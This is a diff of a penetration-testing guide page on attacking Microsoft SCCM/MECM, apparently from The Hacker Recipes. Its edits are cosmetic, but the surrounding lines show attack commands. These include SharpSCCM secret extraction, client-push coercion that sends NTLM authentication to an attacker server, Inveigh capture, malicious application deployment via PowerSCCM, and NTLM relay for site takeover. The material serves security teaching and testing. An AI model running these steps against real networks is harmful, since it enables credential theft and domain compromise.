@@ -4,7 +4,7 @@
 
 The **System Center Configuration Manager** (SCCM), now (since 2020) known as **Microsoft Endpoint Configuration Manager** (MECM), is a software developed by Microsoft to help system administrators manage the servers and workstations in large Active Directory environments. It provides lots of features including remote control, patch management, task automation, application distribution, hardware and software inventory, compliance management and security policy administration.
 
-SCCM is an **on-premise** solution, but Microsoft also maintains a cloud-native client management suite named **Intune**. Both Intune and SCCM are part of the "**Microsoft Endpoint Manager**"  umbrella.
+SCCM is an **on-premise** solution, but Microsoft also maintains a cloud-native client management suite named **Intune**. Both Intune and SCCM are part of the "**Microsoft Endpoint Manager**" umbrella.
 
 ### Topology
 
@@ -15,20 +15,20 @@ Clients are logically grouped into [boundary groups](https://learn.microsoft.com
 Boundary groups also allow for [automatic site assignment](https://learn.microsoft.com/en-us/mem/configmgr/core/clients/deploy/assign-clients-to-a-site#automatic-site-assignment) for discovered clients based on their network location to attach them to the right site and ensure they receive the right configuration.
 
 {% hint style="info" %}
-Each SCCM site is identified by a three-character code to distinguish it in an SCCM hierarchy. This is needed at the client registration process.&#x20;
+Each SCCM site is identified by a three-character code to distinguish it in an SCCM hierarchy. This is needed at the client registration process.
 {% endhint %}
 
 The primary site server manages the clients (like distributing software updates) and can have child servers attached to it ([secondary sites](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/design-a-hierarchy-of-sites#BKMK\_ChooseSecondary)), generally for scalability purpose.
 
 Between the site server and clients sites [the management point](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/plan-for-site-system-servers-and-site-system-roles#management-point) which is an SCCM server role allowing to provide clients with necessary policies and configuration to communicate with the site server and receive configuration data from them.
 
-To get software packages, updates, OS images, etc. clients request the [distribution point](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/plan-for-site-system-servers-and-site-system-roles#distribution-point), which is the SCCM component that hosts and distributes them.&#x20;
+To get software packages, updates, OS images, etc. clients request the [distribution point](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/plan-for-site-system-servers-and-site-system-roles#distribution-point), which is the SCCM component that hosts and distributes them.
 
 All information about the clients, software updates, hardware and software inventories, configuration settings of the site, etc. are stored in a Microsoft SQL Server (MSSQL) instance, known as the [site database server](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/plan-for-the-site-database). This database is used by the site server to retrieve and store information about the managed devices and is also used by the management point to retrieve policies and configuration information needed by the SCCM clients.
 
 In addition, another component called the [SMS Provider](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/plan-for-the-sms-provider#about), provides a set of interfaces between the site server and the site database to give the clients needed information like available software updates and allow them communicate information like status of a software deployment and inventory data to store in the site database.
 
-<figure><img src="../../.gitbook/assets/SCCM_Topology.png" alt=""><figcaption><p>Typical multi-site architecture</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/SCCM_Topology.webp" alt=""><figcaption><p>Typical multi-site architecture</p></figcaption></figure>
 
 ### Deployment types
 
@@ -45,7 +45,7 @@ When SCCM is installed in an Active Directory, the clients can be deployed on th
 
 <summary>Client push installation</summary>
 
-The first way of deploying SCCM is the **Client push installation** method, which is the default one and the least secure.&#x20;
+The first way of deploying SCCM is the **Client push installation** method, which is the default one and the least secure.
 
 This installation will use "client push accounts". They are service accounts with local administrative rights on the assets where SCCM will have to deploy some stuff. The system administrator creates groups of endpoints and for each of those, one "client push account". For each group, only one "client push account" can authenticate with administrator rights on the assets of this group. Thus, if an account is compromised, only the members of the corresponding group can be compromised in turn.
 
@@ -61,11 +61,11 @@ _Nota bene, there is a_ [_feature_](https://learn.microsoft.com/en-us/mem/config
 
 ### Attack path overview
 
-<figure><img src="../../.gitbook/assets/SCCM-Attack-Surface-Overview.png" alt=""><figcaption><p>SCCM Attack Surface Overview</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/SCCM-Attack-Surface-Overview.webp" alt=""><figcaption><p>SCCM Attack Surface Overview</p></figcaption></figure>
 
 ### Recon
 
-Enumerate whether SCCM is present in a target network&#x20;
+Enumerate whether SCCM is present in a target network
 
 {% tabs %}
 {% tab title="Windows" %}
@@ -76,7 +76,7 @@ Using LDAP queries from a **domain-joined** Windows machine
 PS C:\> ([ADSISearcher]("objectClass=mSSMSManagementPoint")).FindAll() | % {$_.Properties}
 ```
 
-<figure><img src="../../.gitbook/assets/SCCM_Recon_ADSI.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/SCCM_Recon_ADSI.webp" alt=""><figcaption></figcaption></figure>
 
 Using WMI queries or [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) to query a clients local WMI database
 
@@ -87,13 +87,13 @@ PS C:\> Get-WmiObject -Class SMS_Authority -Namespace root\CCM
 PS C:\> .\SharpSCCM.exe local site-info
 ```
 
-<figure><img src="../../.gitbook/assets/SCCM_Recon_WMI-SharpSCCM.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/SCCM_Recon_WMI-SharpSCCM.webp" alt=""><figcaption></figcaption></figure>
 {% endtab %}
 
 {% tab title="Linux" %}
 [pxethiefy.py](https://github.com/sse-secure-systems/Active-Directory-Spotlights/tree/master/SCCM-MECM/pxethiefy), which is based on [PXEThief](https://github.com/MWR-CyberSec/PXEThief), can be used to query for PXE boot media:
 
-<figure><img src="../../.gitbook/assets/SCCM_Recon_Linux_pxethiefy.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/SCCM_Recon_Linux_pxethiefy.webp" alt=""><figcaption></figcaption></figure>
 
 There are a few things to note here:
 
@@ -172,7 +172,7 @@ PS:> .\SharpSCCM.exe local secrets -m disk
 PS:> .\SharpSCCM.exe local secrets -m wmi
 ```
 
-<figure><img src="../../.gitbook/assets/SharpSCCM-get-secrets-command.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/SharpSCCM-get-secrets-command.webp" alt=""><figcaption></figcaption></figure>
 {% endtab %}
 
 {% tab title="From Linux" %}
@@ -224,7 +224,7 @@ To decode username and password use `.\DeobfuscateSecretString.exe` contained in
 With a compromised machine in an Active Directory where SCCM is deployed via **Client Push Accounts** on the assets, it is possible to have the "Client Push Account" authenticate to a remote resource and, for instance, retrieve an NTLM response (i.e. [NTLM capture](ntlm/capture.md)). The "Client Push Account" usually has local administrator rights to a lot of assets.
 
 {% hint style="info" %}
-In some case, the "Client Push Accounts"  could even be part of the Domain Admins group, leading to a complete takeover of the domain.
+In some case, the "Client Push Accounts" could even be part of the Domain Admins group, leading to a complete takeover of the domain.
 {% endhint %}
 
 The client push installation can be triggered forcefully or - if you're lucky - your compromised machine might not have the SCCM client installed, which mean you could capture the client push installation as it occurs.
@@ -242,7 +242,7 @@ PS:> .\Inveigh.exe
 Important note: You want to read [this blog](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a) post before you continue this route, as this attack might leave traces behind and might junk up the SCCM environment.
 {% endhint %}
 
-**Step 1: Prepare coercion receiver**&#x20;
+**Step 1: Prepare coercion receiver**
 
 Note that you could either capture & crack received credentials or relay them to a suitable target system (or both).
 
@@ -264,7 +264,7 @@ PS:> .\SharpSCCM.exe invoke client-push -t <AttackerServer> --as-admin
 PS:> .\SharpSCCM.exe invoke client-push -t <AttackerServer>
 ```
 
-**Step 3: Cleanup**&#x20;
+**Step 3: Cleanup**
 
 If you run the above SharpSCCM command with the `--as-admin` parameter (cause you have admin privileges over the MP), there's nothing to do. Otherwise get in contact with the administrator of the SCCM system you just messed up and provide the name or IP of the attacker server you provided in the `-t <AttackerServer>` parameter. This is the device name that will appear in SCCM.
 
@@ -290,11 +290,11 @@ PS:> .\SharpSCCM.exe get class-instances SMS_SCI_Reserved
 
 <div>
 
-<figure><img src="../../.gitbook/assets/SCCM_Lateral_Movement_User_Enum.png" alt=""><figcaption><p>Admin user enumeration in SCCM</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/SCCM_Lateral_Movement_User_Enum.webp" alt=""><figcaption><p>Admin user enumeration in SCCM</p></figcaption></figure>
 
  
 
-<figure><img src="../../.gitbook/assets/SCCM_Lateral_Movement_Special_Account_Enum.png" alt=""><figcaption><p>Special Account Enumeration in SCCM</p></figcaption></figure>
+<figure><img src="../../.gitbook/assets/SCCM_Lateral_Movement_Special_Account_Enum.webp" alt=""><figcaption><p>Special Account Enumeration in SCCM</p></figcaption></figure>
 
 </div>
 {% endtab %}
@@ -349,11 +349,11 @@ Note that the incoming authentication requsts might take a while (couple minutes
 
 <div>
 
-<figure><img src="../../.gitbook/assets/SCCM_Lateral_Movement_Execution_Step3_Trigger_Deployment (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/SCCM_Lateral_Movement_Execution_Step3_Trigger_Deployment.webp" alt=""><figcaption></figcaption></figure>
 
  
 
-<figure><img src="../../.gitbook/assets/SCCM_Lateral_Movement_Execution_Step3_Capture_Authentication.png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/SCCM_Lateral_Movement_Execution_Step3_Capture_Authentication.webp" alt=""><figcaption></figcaption></figure>
 
 </div>
 {% endtab %}
@@ -384,7 +384,7 @@ Get-SccmSession | New-SccmApplicationDeployment -ApplicationName "evilApp" -Assi
 Get-SccmSession | Invoke-SCCMDeviceCheckin -CollectionName "collection"
 </code></pre>
 
-If deploying applications fails, deploying CMScripts is an alternative, which requires a "Configuration Manager" drive on the SCCM server.&#x20;
+If deploying applications fails, deploying CMScripts is an alternative, which requires a "Configuration Manager" drive on the SCCM server.
 
 This [pull request](https://github.com/PowerShellMafia/PowerSCCM/pull/6) on PowerSCCM can be used to do everything in one command. It uses the script `configurationmanager.psd1` created by Microsoft, usually installed on SCCM servers.
 
@@ -397,7 +397,7 @@ New-CMScriptDeployement -CMDrive 'E' -ServerFQDN 'sccm.domain.local' -TargetDevi
 
 ### SCCM Site Takeover
 
-The primary site server's computer account is member of the local Administrators group on the site database server and on every site server hosting the "SMS Provider" role in the hierarchy (See [SCCM Topology](sccm-mecm.md#topology)).&#x20;
+The primary site server's computer account is member of the local Administrators group on the site database server and on every site server hosting the "SMS Provider" role in the hierarchy (See [SCCM Topology](sccm-mecm.md#topology)).
 
 > The user account that installs the site must have the following permissions:
 >
@@ -416,13 +416,13 @@ For more details about how this attack works, refer to the article "[SCCM Site T
 {% endhint %}
 
 {% hint style="warning" %}
-Some requirements are needed to perform the attack:&#x20;
+Some requirements are needed to perform the attack:
 
 * automatic site assignment and automatic site-wide [client push installation](sccm-mecm.md#client-push-installation-1) are enabled
 * fallback to NTLM authentication is enabled (default)
 * the hotfix [KB15599094](https://learn.microsoft.com/fr-fr/mem/configmgr/hotfix/2207/15599094) not installed (it prevents the client push installation account to perform an NTLM connection to a client)
 * PKI certificates are not required for client authentication (default)
-*   &#x20;either:
+*   either:
 
     * MSSQL is reachable on the site database server
 
@@ -434,7 +434,7 @@ Some requirements are needed to perform the attack:&#x20;
 * knowing the NetBIOS name, FQDN, or IP address of the site database server is required
 {% endhint %}
 
-#### 1. Retrieve the controlled user SID&#x20;
+#### 1. Retrieve the controlled user SID
 
 The first step consists in retrieving the hexadecimal format of the user's SID (Security IDentifier) to grant "Full Administrator SCCM role" to, on the site database server. The hex formatted SID is needed in a part below: [#4.-obtain-an-sql-console](sccm-mecm.md#4.-obtain-an-sql-console "mention").
 
@@ -476,7 +476,7 @@ From Windows systems, [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) (C#) can
 
 #### 2. Setup NTLM relay server
 
-The target of the [NTLM relay attack](broken-reference) must be set to the site database server, either on the MS-SQL (port `1433/tcp`), or SMB service (port `445/tcp`) if the relayed user has admin privileges on the target. The rest of this page is focusing on relaying the authentication on the MS-SQL service.
+The target of the [NTLM relay attack](broken-reference/) must be set to the site database server, either on the MS-SQL (port `1433/tcp`), or SMB service (port `445/tcp`) if the relayed user has admin privileges on the target. The rest of this page is focusing on relaying the authentication on the MS-SQL service.
 
 {% tabs %}
 {% tab title="UNIX-like" %}
@@ -496,7 +496,7 @@ From Windows systems, [Inveigh-Relay](https://github.com/Kevin-Robertson/Inveigh
 {% endtab %}
 {% endtabs %}
 
-Fore more insight on NTLM relay attacks and tools options, see the corresponding page on The Hacker Recipes: [Broken link](broken-reference "mention").&#x20;
+Fore more insight on NTLM relay attacks and tools options, see the corresponding page on The Hacker Recipes: [broken-reference](broken-reference/ "mention").
 
 #### 3. Authentication coercion
 
@@ -556,7 +556,7 @@ It is then possible to verify the new privileges on SCCM.
 Post exploitation via SCCM can now be performed on the network.
 
 {% hint style="warning" %}
-The tool author ([Chris Thompson](https://mobile.twitter.com/\_mayyhem)) warns that [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) is a PoC only tested in lab. One should be careful when running in production environments.&#x20;
+The tool author ([Chris Thompson](https://mobile.twitter.com/\_mayyhem)) warns that [SharpSCCM](https://github.com/Mayyhem/SharpSCCM) is a PoC only tested in lab. One should be careful when running in production environments.
 {% endhint %}
 
 ## Resources
